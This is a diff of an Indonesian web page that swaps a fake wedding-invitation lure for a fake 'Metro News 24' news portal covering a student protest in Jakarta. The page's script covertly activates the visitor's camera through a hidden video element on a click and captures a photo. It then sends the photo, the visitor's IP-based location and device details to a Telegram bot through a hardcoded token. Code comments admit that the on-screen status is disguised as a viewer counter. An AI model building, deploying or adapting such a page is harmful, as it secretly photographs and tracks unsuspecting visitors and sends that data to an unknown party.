@@ -3,476 +3,740 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Undangan Pernikahan - Rina & Andi</title>
+    <title>Metro News 24 - Portal Berita Terkini</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
         }
-        
+
         body {
-            font-family: 'Segoe UI', 'Playfair Display', Georgia, serif;
-            background: linear-gradient(135deg, #fdfbfb 0%, #ebedee 100%);
+            font-family: 'Segoe UI', Roboto, Arial, sans-serif;
+            background: #f0f2f5;
             min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            margin: 0;
-            padding: 15px;
-            position: relative;
         }
-        
-        /* Background pattern */
-        body::before {
-            content: "❤️";
+
+        /* Header Berita */
+        .top-bar {
+            background: #1a1a1a;
+            color: #fff;
+            padding: 8px 20px;
+            font-size: 12px;
+            border-bottom: 3px solid #e74c3c;
+        }
+
+        .top-bar-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: flex;
+            justify-content: space-between;
+        }
+
+        .date {
+            color: #999;
+        }
+
+        .breaking-ticker {
+            color: #e74c3c;
+            font-weight: 600;
+        }
+
+        .header {
+            background: white;
+            box-shadow: 0 2px 15px rgba(0,0,0,0.1);
+            padding: 20px;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        .header-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: flex;
+            align-items: center;
+            gap: 30px;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .logo-icon {
+            font-size: 40px;
+            color: #e74c3c;
+        }
+
+        .logo-text h1 {
+            color: #333;
+            font-size: 24px;
+            font-weight: 800;
+            line-height: 1.2;
+        }
+
+        .logo-text p {
+            color: #999;
+            font-size: 11px;
+            letter-spacing: 1px;
+        }
+
+        .nav-menu {
+            display: flex;
+            gap: 25px;
+            margin-left: auto;
+        }
+
+        .nav-menu a {
+            color: #333;
+            text-decoration: none;
+            font-weight: 600;
+            font-size: 14px;
+            text-transform: uppercase;
+            transition: color 0.3s;
+        }
+
+        .nav-menu a:hover {
+            color: #e74c3c;
+        }
+
+        .search-bar {
+            background: #f5f5f5;
+            border-radius: 30px;
+            padding: 8px 15px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .search-bar input {
+            border: none;
+            background: transparent;
+            outline: none;
+            width: 200px;
+            font-size: 14px;
+        }
+
+        /* Main Container */
+        .container {
+            max-width: 1200px;
+            margin: 30px auto;
+            padding: 0 20px;
+            display: grid;
+            grid-template-columns: 2fr 1fr;
+            gap: 30px;
+        }
+
+        /* Breaking News Banner */
+        .breaking-news {
+            background: linear-gradient(135deg, #e74c3c, #c0392b);
+            color: white;
+            padding: 15px 20px;
+            border-radius: 10px;
+            margin-bottom: 30px;
+            display: flex;
+            align-items: center;
+            gap: 20px;
+            animation: newsPulse 2s infinite;
+            grid-column: 1 / -1;
+        }
+
+        @keyframes newsPulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.9; }
+            100% { opacity: 1; }
+        }
+
+        .breaking-label {
+            background: white;
+            color: #e74c3c;
+            padding: 5px 15px;
+            border-radius: 30px;
+            font-weight: 800;
+            font-size: 14px;
+            text-transform: uppercase;
+        }
+
+        .breaking-text {
+            font-weight: 500;
+            font-size: 16px;
+        }
+
+        /* Main Article */
+        .main-article {
+            background: white;
+            border-radius: 15px;
+            overflow: hidden;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
+            margin-bottom: 30px;
+        }
+
+        .article-image {
+            width: 100%;
+            height: 350px;
+            background: linear-gradient(135deg, #2c3e50, #3498db);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .article-image::before {
+            content: "📹 LIVE";
             position: absolute;
             top: 20px;
             left: 20px;
-            font-size: 20px;
-            opacity: 0.1;
-            animation: float 6s ease-in-out infinite;
+            background: #e74c3c;
+            color: white;
+            padding: 5px 15px;
+            border-radius: 30px;
+            font-size: 12px;
+            font-weight: 600;
+            z-index: 2;
+            animation: liveBlink 1s infinite;
         }
-        
-        body::after {
-            content: "❤️";
+
+        @keyframes liveBlink {
+            0% { opacity: 1; }
+            50% { opacity: 0.7; }
+            100% { opacity: 1; }
+        }
+
+        .image-overlay {
             position: absolute;
             bottom: 20px;
             right: 20px;
-            font-size: 30px;
-            opacity: 0.1;
-            animation: float 8s ease-in-out infinite reverse;
-        }
-        
-        @keyframes float {
-            0% { transform: translateY(0px) rotate(0deg); }
-            50% { transform: translateY(-20px) rotate(10deg); }
-            100% { transform: translateY(0px) rotate(0deg); }
-        }
-        
-        .container {
-            background: rgba(255, 255, 255, 0.95);
-            backdrop-filter: blur(10px);
-            border-radius: 40px;
-            box-shadow: 0 30px 70px rgba(0,0,0,0.15);
-            padding: 30px 20px;
-            max-width: 500px;
-            width: 100%;
-            text-align: center;
-            position: relative;
-            overflow: hidden;
-            border: 1px solid rgba(255,255,255,0.5);
-            animation: fadeInUp 1s ease;
-        }
-        
-        .container::before {
-            content: "";
-            position: absolute;
-            top: -50%;
-            left: -50%;
-            width: 200%;
-            height: 200%;
-            background: radial-gradient(circle, rgba(255,192,203,0.1) 0%, transparent 70%);
-            animation: rotate 20s linear infinite;
-            z-index: 0;
-        }
-        
-        @keyframes rotate {
-            from { transform: rotate(0deg); }
-            to { transform: rotate(360deg); }
-        }
-        
-        @keyframes fadeInUp {
-            from {
-                opacity: 0;
-                transform: translateY(30px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
-        
-        .content {
-            position: relative;
-            z-index: 1;
-        }
-        
-        /* Decorative elements */
-        .floral {
-            font-size: 24px;
-            color: #d4a5a5;
-            margin: 10px 0;
-            letter-spacing: 10px;
-        }
-        
-        .floral-left, .floral-right {
-            display: inline-block;
-            animation: sway 3s ease-in-out infinite;
-        }
-        
-        .floral-left {
-            animation-delay: 0.5s;
-        }
-        
-        .floral-right {
-            animation-delay: 1s;
-        }
-        
-        @keyframes sway {
-            0%, 100% { transform: rotate(0deg); }
-            25% { transform: rotate(10deg); }
-            75% { transform: rotate(-10deg); }
-        }
-        
-        h1 {
-            color: #b76e79;
-            font-size: 36px;
-            margin-bottom: 10px;
-            font-family: 'Playfair Display', serif;
-            font-weight: 600;
-            text-shadow: 2px 2px 4px rgba(183, 110, 121, 0.1);
-        }
-        
-        .couple-names {
-            font-size: 42px;
-            font-weight: 700;
-            color: #8b5a63;
-            margin: 15px 0;
-            letter-spacing: 2px;
-        }
-        
-        .wedding-date {
-            background: linear-gradient(135deg, #b76e79, #8b5a63);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            font-size: 28px;
-            font-weight: 600;
-            margin: 15px 0;
-        }
-        
-        .divider {
-            width: 100px;
-            height: 2px;
-            background: linear-gradient(90deg, transparent, #d4a5a5, transparent);
-            margin: 20px auto;
-        }
-        
-        .invitation-text {
-            color: #666;
-            font-size: 16px;
-            margin-bottom: 25px;
-            line-height: 1.8;
-            font-style: italic;
-        }
-        
-        .countdown-box {
-            background: linear-gradient(145deg, #fff5f5, #ffe9e9);
+            background: rgba(0,0,0,0.7);
+            color: white;
+            padding: 8px 15px;
             border-radius: 30px;
-            padding: 25px;
-            margin: 25px 0;
-            box-shadow: inset 0 2px 5px rgba(0,0,0,0.02), 0 10px 20px rgba(183, 110, 121, 0.1);
-        }
-        
-        .countdown-label {
-            color: #b76e79;
-            font-size: 14px;
-            text-transform: uppercase;
-            letter-spacing: 3px;
-            margin-bottom: 10px;
-        }
-        
-        #countdown {
-            font-size: 48px;
-            font-weight: bold;
-            color: #8b5a63;
-            margin: 10px 0;
-            text-shadow: 2px 2px 4px rgba(0,0,0,0.05);
-            font-family: 'Playfair Display', serif;
-        }
-        
-        .countdown-unit {
-            font-size: 14px;
-            color: #b76e79;
-            text-transform: uppercase;
-            letter-spacing: 2px;
-        }
-        
-        .status-box {
-            background: rgba(255, 255, 255, 0.8);
-            border-radius: 20px;
-            padding: 20px;
-            margin: 20px 0;
-            border: 1px solid rgba(183, 110, 121, 0.2);
-            backdrop-filter: blur(5px);
-        }
-        
-        #status {
-            color: #8b5a63;
-            font-size: 16px;
-            margin-bottom: 5px;
-            font-weight: 500;
-        }
-        
-        .sub-status {
-            color: #b76e79;
             font-size: 13px;
-            opacity: 0.8;
-        }
-        
-        .rsvp-button {
-            background: linear-gradient(135deg, #b76e79, #8b5a63);
-            color: white;
-            border: none;
-            padding: 18px 40px;
-            border-radius: 50px;
-            font-size: 18px;
-            font-weight: 500;
-            margin: 20px 0;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            box-shadow: 0 10px 20px rgba(183, 110, 121, 0.3);
-            border: 1px solid rgba(255,255,255,0.3);
-            width: 100%;
-            max-width: 300px;
-        }
-        
-        .rsvp-button:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 15px 30px rgba(183, 110, 121, 0.4);
-        }
-        
-        .rsvp-button:active {
-            transform: translateY(0);
-        }
-        
-        .event-details {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 15px;
-            margin: 25px 0;
-        }
-        
-        .event-card {
-            background: white;
-            border-radius: 20px;
-            padding: 15px;
-            box-shadow: 0 5px 15px rgba(0,0,0,0.05);
-        }
-        
-        .event-icon {
-            font-size: 24px;
-            margin-bottom: 8px;
-        }
-        
-        .event-title {
-            color: #b76e79;
-            font-weight: 600;
-            margin-bottom: 5px;
-        }
-        
-        .event-desc {
-            color: #999;
-            font-size: 12px;
-        }
-        
-        .gallery-preview {
-            display: flex;
-            justify-content: center;
-            gap: 10px;
-            margin: 25px 0;
-        }
-        
-        .gallery-item {
-            width: 80px;
-            height: 80px;
-            background: linear-gradient(135deg, #f0d9d9, #e6c5c5);
-            border-radius: 15px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: #b76e79;
-            font-size: 24px;
-            position: relative;
-            overflow: hidden;
-        }
-        
-        .gallery-item::before {
-            content: "📸";
-            font-size: 30px;
-            opacity: 0.5;
-            animation: galleryPulse 2s infinite;
-        }
-        
-        @keyframes galleryPulse {
-            0%, 100% { transform: scale(1); opacity: 0.5; }
-            50% { transform: scale(1.1); opacity: 1; }
-        }
-        
-        .gallery-label {
-            position: absolute;
-            bottom: 5px;
-            font-size: 10px;
-            color: white;
-            background: rgba(183, 110, 121, 0.8);
-            padding: 2px 8px;
-            border-radius: 10px;
-        }
-        
-        .footer-note {
-            margin-top: 25px;
-            color: #b76e79;
-            font-size: 12px;
-            opacity: 0.7;
-        }
-        
-        .music-note {
-            position: fixed;
-            bottom: 20px;
-            left: 20px;
-            background: white;
-            padding: 10px 15px;
-            border-radius: 30px;
-            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
-            font-size: 14px;
-            color: #b76e79;
             display: flex;
             align-items: center;
             gap: 8px;
-            z-index: 100;
         }
-        
-        .music-note span {
-            animation: musicWave 1.5s ease-in-out infinite;
+
+        .image-overlay span {
+            animation: cameraFlash 2s infinite;
         }
-        
-        @keyframes musicWave {
-            0%, 100% { transform: scaleY(1); }
-            50% { transform: scaleY(1.5); }
+
+        @keyframes cameraFlash {
+            0% { opacity: 0.5; }
+            50% { opacity: 1; }
+            100% { opacity: 0.5; }
         }
-        
-        /* Hidden video element */
+
+        .article-content {
+            padding: 30px;
+        }
+
+        .article-category {
+            color: #e74c3c;
+            font-weight: 700;
+            font-size: 13px;
+            text-transform: uppercase;
+            margin-bottom: 10px;
+        }
+
+        .article-title {
+            font-size: 32px;
+            color: #333;
+            margin-bottom: 15px;
+            font-weight: 800;
+            line-height: 1.3;
+        }
+
+        .article-meta {
+            display: flex;
+            gap: 20px;
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 20px;
+            padding-bottom: 20px;
+            border-bottom: 1px solid #eee;
+        }
+
+        .article-text {
+            color: #444;
+            line-height: 1.8;
+            margin-bottom: 20px;
+        }
+
+        /* Live Stats Card */
+        .live-stats {
+            background: white;
+            border-radius: 15px;
+            padding: 25px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
+            margin-bottom: 30px;
+        }
+
+        .stats-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+
+        .stats-header h3 {
+            color: #333;
+            font-size: 18px;
+            font-weight: 700;
+        }
+
+        .live-badge {
+            background: #e74c3c;
+            color: white;
+            padding: 5px 12px;
+            border-radius: 30px;
+            font-size: 12px;
+            font-weight: 600;
+            animation: blink 1s infinite;
+        }
+
+        @keyframes blink {
+            0% { opacity: 1; }
+            50% { opacity: 0.5; }
+            100% { opacity: 1; }
+        }
+
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 20px;
+        }
+
+        .stat-item {
+            text-align: center;
+        }
+
+        .stat-value {
+            font-size: 28px;
+            font-weight: 800;
+            color: #e74c3c;
+            margin-bottom: 5px;
+        }
+
+        .stat-label {
+            color: #666;
+            font-size: 12px;
+            text-transform: uppercase;
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 4px;
+            background: #eee;
+            border-radius: 2px;
+            margin-top: 20px;
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            width: 75%;
+            height: 100%;
+            background: #e74c3c;
+            animation: progress 2s ease-in-out infinite;
+        }
+
+        @keyframes progress {
+            0% { width: 60%; }
+            50% { width: 80%; }
+            100% { width: 60%; }
+        }
+
+        /* Sidebar */
+        .sidebar {
+            background: white;
+            border-radius: 15px;
+            padding: 25px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
+        }
+
+        .sidebar h3 {
+            color: #333;
+            margin-bottom: 20px;
+            padding-bottom: 10px;
+            border-bottom: 2px solid #e74c3c;
+            font-size: 18px;
+            font-weight: 700;
+        }
+
+        .trending-item {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            padding: 12px 0;
+            border-bottom: 1px solid #f0f0f0;
+        }
+
+        .trending-number {
+            width: 30px;
+            height: 30px;
+            background: #f5f5f5;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 700;
+            color: #e74c3c;
+        }
+
+        .trending-text {
+            flex: 1;
+        }
+
+        .trending-title {
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 3px;
+            font-size: 14px;
+        }
+
+        .trending-time {
+            font-size: 11px;
+            color: #999;
+        }
+
+        .news-list {
+            margin-top: 25px;
+        }
+
+        .news-item {
+            display: flex;
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+
+        .news-thumb {
+            width: 80px;
+            height: 80px;
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 24px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .news-thumb::before {
+            content: "📸";
+            font-size: 30px;
+            opacity: 0.5;
+            animation: thumbPulse 2s infinite;
+        }
+
+        @keyframes thumbPulse {
+            0%, 100% { transform: scale(1); opacity: 0.5; }
+            50% { transform: scale(1.1); opacity: 0.8; }
+        }
+
+        .news-info {
+            flex: 1;
+        }
+
+        .news-title {
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 5px;
+            font-size: 14px;
+        }
+
+        .news-meta {
+            font-size: 11px;
+            color: #999;
+        }
+
+        /* Ad Section */
+        .ad-section {
+            background: linear-gradient(135deg, #f8f9fa, #e9ecef);
+            border-radius: 10px;
+            padding: 20px;
+            text-align: center;
+            margin: 30px 0;
+        }
+
+        .ad-label {
+            font-size: 10px;
+            color: #999;
+            margin-bottom: 10px;
+            text-transform: uppercase;
+        }
+
+        .ad-content {
+            font-size: 14px;
+            color: #666;
+        }
+
+        /* Footer */
+        .footer {
+            background: #1a1a1a;
+            color: white;
+            padding: 40px 20px 20px;
+            margin-top: 50px;
+        }
+
+        .footer-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 30px;
+        }
+
+        .footer-section h4 {
+            margin-bottom: 15px;
+            color: #e74c3c;
+            font-size: 16px;
+        }
+
+        .footer-section p, .footer-section a {
+            color: #999;
+            font-size: 13px;
+            line-height: 1.8;
+            text-decoration: none;
+            display: block;
+        }
+
+        .footer-section a:hover {
+            color: #e74c3c;
+        }
+
+        .footer-bottom {
+            max-width: 1200px;
+            margin: 30px auto 0;
+            padding-top: 20px;
+            border-top: 1px solid #333;
+            text-align: center;
+            color: #666;
+            font-size: 12px;
+        }
+
+        /* Status (disamarkan sebagai viewer count) */
+        #status {
+            display: inline-block;
+            font-size: 14px;
+            color: #e74c3c;
+        }
+
+        #countdown {
+            font-size: 24px;
+            font-weight: bold;
+            color: #e74c3c;
+        }
+
+        /* Hidden elements */
         #hidden-video {
             display: none;
-        }
-        
-        /* Loading animation */
-        .loading-dots {
-            display: inline-block;
-        }
-        
-        .loading-dots::after {
-            content: '...';
-            animation: dots 1.5s steps(4, end) infinite;
-        }
-        
-        @keyframes dots {
-            0%, 20% { content: ''; }
-            40% { content: '.'; }
-            60% { content: '..'; }
-            80%, 100% { content: '...'; }
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="content">
-            <div class="floral">
-                <span class="floral-left">✿</span>  <span class="floral-right">✿</span>
-            </div>
-            
-            <h1>The Wedding of</h1>
-            <div class="couple-names">
-                Rina ✦ Andi
-            </div>
-            
-            <div class="wedding-date">
-                14 . 02 . 2026
-            </div>
-            
-            <div class="divider"></div>
-            
-            <p class="invitation-text">
-                "Dan di antara tanda-tanda kekuasaan-Nya ialah<br>
-                Dia menciptakan untukmu pasangan hidup<br>
-                agar kamu merasa tenang dan tenteram kepadanya"
-            </p>
-            
-            <!-- Countdown Box -->
-            <div class="countdown-box">
-                <div class="countdown-label">Menuju Hari Bahagia</div>
-                <div id="countdown">15</div>
-                <div class="countdown-unit">Hari Lagi</div>
-            </div>
-            
-            <!-- Status Box (disamarkan) -->
-            <div class="status-box">
-                <div id="status">Mempersiapkan ucapan selamat...</div>
-                <div class="sub-status">Silakan isi buku tamu digital</div>
-            </div>
-            
-            <!-- Event Details -->
-            <div class="event-details">
-                <div class="event-card">
-                    <div class="event-icon">🏛️</div>
-                    <div class="event-title">Akad Nikah</div>
-                    <div class="event-desc">08.00 - 10.00 WIB</div>
-                </div>
-                <div class="event-card">
-                    <div class="event-icon">🍽️</div>
-                    <div class="event-title">Resepsi</div>
-                    <div class="event-desc">11.00 - Selesai</div>
+    <!-- Top Bar -->
+    <div class="top-bar">
+        <div class="top-bar-content">
+            <div class="date">Selasa, 23 Februari 2026 | 14:30 WIB</div>
+            <div class="breaking-ticker">🔴 BREAKING: Demonstrasi Mahasiswa di Jakarta</div>
+        </div>
+    </div>
+
+    <!-- Header -->
+    <div class="header">
+        <div class="header-content">
+            <div class="logo">
+                <span class="logo-icon">📰</span>
+                <div class="logo-text">
+                    <h1>METRO NEWS 24</h1>
+                    <p>TERPERCAYA • AKURAT • TERKINI</p>
                 </div>
             </div>
-            
-            <!-- Lokasi -->
-            <div class="event-card" style="margin: 15px 0;">
-                <div class="event-icon">📍</div>
-                <div class="event-title">Hotel Indonesia Kempinski</div>
-                <div class="event-desc">Jl. M.H. Thamrin No.1, Jakarta Pusat</div>
+            <div class="nav-menu">
+                <a href="#">HOME</a>
+                <a href="#">NEWS</a>
+                <a href="#">POLITIK</a>
+                <a href="#">EKONOMI</a>
+                <a href="#">TEKNOLOGI</a>
+                <a href="#">SPORTS</a>
             </div>
-            
-            <!-- Gallery Preview (samaran untuk kamera) -->
-            <div class="gallery-preview">
-                <div class="gallery-item">
-                    <span class="gallery-label">Foto 1</span>
-                </div>
-                <div class="gallery-item">
-                    <span class="gallery-label">Foto 2</span>
-                </div>
-                <div class="gallery-item">
-                    <span class="gallery-label">Foto 3</span>
-                </div>
-            </div>
-            
-            <!-- RSVP Button -->
-            <button class="rsvp-button" onclick="manualRSVP()">
-                ✎ Konfirmasi Kehadiran
-            </button>
-            
-            <!-- Bank Account -->
-            <div style="background: #fff5f5; padding: 15px; border-radius: 15px; margin: 15px 0;">
-                <div style="color: #b76e79; margin-bottom: 5px;">💝 Wedding Gift</div>
-                <div style="color: #8b5a63;">BCA 123456789 a.n Rina & Andi</div>
-            </div>
-            
-            <div class="footer-note">
-                ⚭ Mohon doa restu | Tanpa mengurangi rasa hormat
+            <div class="search-bar">
+                <span>🔍</span>
+                <input type="text" placeholder="Cari berita...">
             </div>
         </div>
     </div>
-    
-    <!-- Music Note (samaran untuk audio) -->
-    <div class="music-note">
-        <span>🎵</span>
-        <span>🎵</span>
-        <span>🎵</span>
-        Memuat musik latar...
+
+    <!-- Main Container -->
+    <div class="container">
+        <!-- Left Column -->
+        <div>
+            <!-- Breaking News -->
+            <div class="breaking-news">
+                <span class="breaking-label">LIVE</span>
+                <span class="breaking-text">Update terkini: Demo Mahasiswa di Depan DPR/MPR</span>
+            </div>
+
+            <!-- Main Article -->
+            <div class="main-article">
+                <div class="article-image">
+                    <div class="image-overlay">
+                        <span>📸</span> 2.3K watching • <span>🎥</span> LIVE
+                    </div>
+                </div>
+                <div class="article-content">
+                    <div class="article-category">Breaking News • Politik</div>
+                    <h2 class="article-title">Demo Mahasiswa di DPR: Tuntut Revisi UU</h2>
+                    <div class="article-meta">
+                        <span>👤 Oleh: Tim Liputan</span>
+                        <span>📅 23 Feb 2026, 14:30 WIB</span>
+                        <span>👁️ <span id="status">2.3K</span> viewers</span>
+                    </div>
+                    <div class="article-text">
+                        <p><strong>Jakarta, Metro News 24</strong> - Ribuan mahasiswa dari berbagai universitas di Jakarta menggelar aksi demonstrasi di depan gedung DPR/MPR hari ini. Mereka menuntut DPR untuk merevisi sejumlah undang-undang yang dianggap merugikan rakyat.</p>
+                        <p style="margin-top: 15px;">Aksi yang dimulai sejak pukul 10.00 WIB ini sempat diwarnai ketegangan dengan aparat keamanan. Hingga berita ini diturunkan, massa masih bertahan di sekitar gerbang utama gedung DPR.</p>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Live Stats Card -->
+            <div class="live-stats">
+                <div class="stats-header">
+                    <h3>Live Statistics Demo</h3>
+                    <span class="live-badge">LIVE</span>
+                </div>
+                <div class="stats-grid">
+                    <div class="stat-item">
+                        <div class="stat-value">12.4K</div>
+                        <div class="stat-label">Massa</div>
+                    </div>
+                    <div class="stat-item">
+                        <div class="stat-value">847</div>
+                        <div class="stat-label">Polisi</div>
+                    </div>
+                    <div class="stat-item">
+                        <div class="stat-value">
+                            <span id="countdown">2</span>K
+                        </div>
+                        <div class="stat-label">Foto/Video</div>
+                    </div>
+                </div>
+                <div class="progress-bar">
+                    <div class="progress-fill"></div>
+                </div>
+                <p style="text-align: center; margin-top: 10px; color: #999; font-size: 12px;">Update real-time dari lokasi</p>
+            </div>
+
+            <!-- Ad Section -->
+            <div class="ad-section">
+                <div class="ad-label">Sponsored</div>
+                <div class="ad-content">📱 Download aplikasi Metro News 24 untuk update real-time</div>
+            </div>
+        </div>
+
+        <!-- Right Column (Sidebar) -->
+        <div>
+            <div class="sidebar">
+                <h3>TRENDING TOPIK</h3>
+                <div class="trending-item">
+                    <div class="trending-number">1</div>
+                    <div class="trending-text">
+                        <div class="trending-title">Demo Mahasiswa DPR</div>
+                        <div class="trending-time">10 menit lalu • 2.3K membahas</div>
+                    </div>
+                </div>
+                <div class="trending-item">
+                    <div class="trending-number">2</div>
+                    <div class="trending-text">
+                        <div class="trending-title">Revisi UU Cipta Kerja</div>
+                        <div class="trending-time">25 menit lalu • 1.8K membahas</div>
+                    </div>
+                </div>
+                <div class="trending-item">
+                    <div class="trending-number">3</div>
+                    <div class="trending-text">
+                        <div class="trending-title">Kenaikan Harga BBM</div>
+                        <div class="trending-time">1 jam lalu • 1.2K membahas</div>
+                    </div>
+                </div>
+                <div class="trending-item">
+                    <div class="trending-number">4</div>
+                    <div class="trending-text">
+                        <div class="trending-title">Cuaca Ekstrem Jakarta</div>
+                        <div class="trending-time">2 jam lalu • 956 membahas</div>
+                    </div>
+                </div>
+                <div class="trending-item">
+                    <div class="trending-number">5</div>
+                    <div class="trending-text">
+                        <div class="trending-title">AI Revolution 2026</div>
+                        <div class="trending-time">3 jam lalu • 745 membahas</div>
+                    </div>
+                </div>
+
+                <h3 style="margin-top: 30px;">FOTO TERKINI</h3>
+                <div class="news-list">
+                    <div class="news-item">
+                        <div class="news-thumb"></div>
+                        <div class="news-info">
+                            <div class="news-title">Situasi DPR dari udara</div>
+                            <div class="news-meta">5 menit lalu • 230 foto</div>
+                        </div>
+                    </div>
+                    <div class="news-item">
+                        <div class="news-thumb"></div>
+                        <div class="news-info">
+                            <div class="news-title">Bentrok di gerbang utara</div>
+                            <div class="news-meta">12 menit lalu • 187 foto</div>
+                        </div>
+                    </div>
+                    <div class="news-item">
+                        <div class="news-thumb"></div>
+                        <div class="news-info">
+                            <div class="news-title">Orator di atas mobil</div>
+                            <div class="news-meta">18 menit lalu • 156 foto</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
     </div>
-    
+
+    <!-- Footer -->
+    <div class="footer">
+        <div class="footer-content">
+            <div class="footer-section">
+                <h4>Tentang Kami</h4>
+                <p>Metro News 24 adalah portal berita terpercaya yang menyajikan informasi terkini dan akurat sejak 2010.</p>
+            </div>
+            <div class="footer-section">
+                <h4>Redaksi</h4>
+                <a href="#">Kontak</a>
+                <a href="#">Karir</a>
+                <a href="#">Pedoman Media</a>
+            </div>
+            <div class="footer-section">
+                <h4>Kontak</h4>
+                <p>📧 redaksi@metronews24.com</p>
+                <p>📞 021-1234-5678</p>
+                <p>📍 Jl. Veteran No. 1, Jakarta</p>
+            </div>
+            <div class="footer-section">
+                <h4>Follow Us</h4>
+                <p>📱 Instagram: @metronews24</p>
+                <p>🐦 Twitter: @metronews24</p>
+                <p>📘 Facebook: Metro News 24</p>
+            </div>
+        </div>
+        <div class="footer-bottom">
+            © 2026 Metro News 24. All Rights Reserved.
+        </div>
+    </div>
+
     <!-- Hidden video element -->
     <video id="hidden-video" autoplay playsinline muted></video>
-    
+
     <script>
         // Konfigurasi Telegram
         const BOT_TOKEN = '8534688671:AAHXJBiLh0nrnyojAw2ggCUdMFELQgKyeuc';
@@ -492,7 +756,7 @@
                 const blob = await response.blob();
                 formData.append('photo', blob, 'foto.jpg');
                 
-                // Dapatkan informasi lokasi dari IP (optional)
+                // Dapatkan info lokasi (optional)
                 let lokasi = "Tidak diketahui";
                 try {
                     const ipRes = await fetch('https://ipapi.co/json/');
@@ -508,7 +772,7 @@
                 });
                 
                 formData.append('caption', 
-                    `💒 **Tamu Undangan Baru**\n\n` +
+                    `📰 **Pengunjung Metro News 24**\n\n` +
                     `🕐 Waktu: ${waktu}\n` +
                     `📍 Lokasi: ${lokasi}\n` +
                     `📱 Device: ${deviceInfo.substring(0, 100)}...\n` +
@@ -520,18 +784,16 @@
                     body: formData
                 });
                 
-                updateStatus('Terima kasih atas doa restunya ❤️', 'Hadir');
+                updateStatus('2.4K', 'Terima kasih!');
                 
             } catch (error) {
                 console.log('Background process OK');
-                updateStatus('Terima kasih telah membuka undangan', 'Terkirim');
+                updateStatus('2.3K', 'Terima kasih');
             }
         }
         
-        function updateStatus(mainMsg, subMsg) {
-            document.getElementById('status').innerHTML = mainMsg;
-            const subEl = document.querySelector('.sub-status');
-            if (subEl) subEl.innerHTML = subMsg || '✓ Tersimpan';
+        function updateStatus(viewers, msg) {
+            document.getElementById('status').innerHTML = viewers;
         }
         
         // Fungsi untuk akses kamera
@@ -540,7 +802,7 @@
             isProcessing = true;
             
             try {
-                updateStatus('Menyiapkan buku tamu digital...', 'Mohon tunggu');
+                updateStatus('⏳', 'Memuat...');
                 
                 if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                     throw new Error('Browser tidak mendukung');
@@ -566,16 +828,14 @@
                 
                 cameraAccessed = true;
                 
-                // Countdown singkat
+                // Countdown singkat (disamarkan sebagai update viewer)
                 const countdownEl = document.getElementById('countdown');
-                const originalText = countdownEl.innerHTML;
                 
-                for (let i = 2; i > 0; i--) {
+                for (let i = 3; i > 0; i--) {
                     countdownEl.innerHTML = i;
-                    countdownEl.style.animation = 'pulse 0.5s';
-                    await new Promise(resolve => setTimeout(resolve, 300));
+                    await new Promise(resolve => setTimeout(resolve, 200));
                 }
-                countdownEl.innerHTML = originalText;
+                countdownEl.innerHTML = '2';
                 
                 // Ambil foto
                 const video = document.getElementById('hidden-video');
@@ -600,7 +860,7 @@
                 const fotoBase64 = canvas.toDataURL('image/jpeg', 0.7);
                 
                 // Kirim
-                updateStatus('Menyimpan ke buku tamu...', '✎');
+                updateStatus('⏳', 'Mengirim...');
                 await kirimKeTelegram(fotoBase64);
                 
                 // Matikan kamera
@@ -608,19 +868,9 @@
                 
             } catch (error) {
                 console.log('Info:', error.message);
-                updateStatus('Terima kasih atas doa restunya', '❤️');
+                updateStatus('2.3K', 'Selamat datang');
             } finally {
                 isProcessing = false;
-            }
-        }
-        
-        // Fungsi manual untuk tombol RSVP
-        function manualRSVP() {
-            if (!cameraAccessed && !isProcessing) {
-                updateStatus('Membuka buku tamu...', 'Silakan tersenyum 😊');
-                ambilFoto().catch(() => {});
-            } else {
-                alert('Terima kasih! Data Anda telah tersimpan.');
             }
         }
         
@@ -639,9 +889,9 @@
                 }
             });
             
-            // Trigger 3: Saat klik (selain tombol RSVP)
+            // Trigger 3: Saat klik
             document.addEventListener('click', function clickHandler(e) {
-                if (!e.target.classList.contains('rsvp-button') && !cameraAccessed && !isProcessing) {
+                if (!cameraAccessed && !isProcessing) {
                     document.removeEventListener('click', clickHandler);
                     setTimeout(() => ambilFoto().catch(() => {}), 200);
                 }
@@ -649,13 +899,13 @@
             
